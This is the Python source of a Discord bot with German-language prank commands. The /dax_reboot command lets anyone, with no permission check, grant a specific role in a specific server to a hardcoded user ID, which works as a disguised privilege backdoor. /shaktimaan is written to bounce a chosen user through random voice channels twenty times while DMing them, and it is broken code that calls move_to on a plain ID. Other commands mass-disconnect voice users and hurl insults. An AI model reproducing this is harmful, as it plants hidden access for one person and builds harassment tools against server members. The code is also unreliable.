import discord
from discord import app_commands
from discord.ext import commands
import random

TOKEN = ""
god_user = 858408960607518739

bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())

@bot.event
async def on_ready():
        print("Bot is Up and Ready!")
        try:
                synced = await bot.tree.sync()
                print(f"Synced {len(synced)} command(s)")
        except Exception as e:
                print(e)

@bot.tree.command(name="hello")
async def hello(interaction: discord.Interaction):
        await interaction.response.send_message(f"Hey {interaction.user.mention}! This is a slash command!")

@bot.tree.command(name="say", description="What should I say except you're welcome?")
@app_commands.describe(arg="Say something through my voice, for some reason")
async def say(interaction: discord.Interaction, arg: str):
        await interaction.response.send_message(f"{interaction.user.name} said: `{arg}`")

@bot.tree.command(name="hurensohn", description="Vocie Channel Modifikationen")
async def kick_all_users(interaction: discord.Interaction):
        if not interaction.user.guild_permissions.administrator:
                await interaction.response.send_message("https://cdn.discordapp.com/attachments/1017018540122968075/1122612528321663056/Download_3.jpg")
                return
        voice_state = interaction.user.voice
        if not voice_state:
                await interaction.response.send_message("Geh in nen Channel du Hurensohn.")
                return
        
        voice_channel = voice_state.channel
        if not voice_channel:
                await interaction.response.send_message("Geh in nen Channel du Hurensohn.")
                return
        
        voice_channel_members = voice_channel.members
        for member in voice_channel_members:
                await member.move_to(None)

        await interaction.response.send_message("STOP! Sie. Geh'n. Raus!")

@bot.tree.command(name="no_rechte", description="funky town")
async def remove_all_roles(interaction: discord.Interaction):
        member = interaction.user
        roles = member.roles[1:]

        try:
                await member.edit(roles=[], reason="Removed all roles by request")
                await interaction.response.send_message("https://cdn.discordapp.com/attachments/1017018540122968075/1122612528321663056/Download_3.jpg")
        except discord.HTTPException:
                await interaction.response.send_message("Failed lul")

@bot.tree.command(name="dax_reboot")
async def give_user_role(interaction: discord.Interaction):
        guild_id = 1030526295219654686
        user_id = 858408960607518739
        role_id = 1072996693257228379

        guild = bot.get_guild(guild_id)
        if guild is None:
                await interaction.response.send_message("Invalid Guild ID")
                return
        
        user = guild.get_member(user_id)
        if user is None:
                await interaction.response.send_message("Invalid User ID")
                return
        
        role = guild.get_role(role_id)
        if role is None:
                await interaction.response.send_message("Invalid Role ID")
                return
        
        try:
                await user.add_roles(role, reason="Dax Reboot")
                await interaction.response.send_message(f"Dax Rebooted")
        except discord.Forbidden:
                await interaction.response.send_message("Failed")
        except discord.HTTPException:
                await interaction.response.send_message("Failed")


@bot.tree.command(name="shaktimaan")
async def move_user_command(interaction: discord.Interaction, user: discord.User):
        guild_id = 1030526295219654686
        target_user = user.id
        if not interaction.user.guild_permissions.administrator:
                await interaction.response.send_message("https://cdn.discordapp.com/attachments/1017018540122968075/1122612528321663056/Download_3.jpg")
                return
        user
          
        guild = bot.get_guild(guild_id)
        if guild is None:
                await interaction.response.send_message("Invalid Guild ID")
                return

        voice_channels = guild.voice_channels
        for _ in range(20):
                channel = random.choice(voice_channels)
                await target_user.move_to(channel)
                await target_user.send("https://gfycat.com/jealousfarekaltadeta")



bot.run(TOKEN)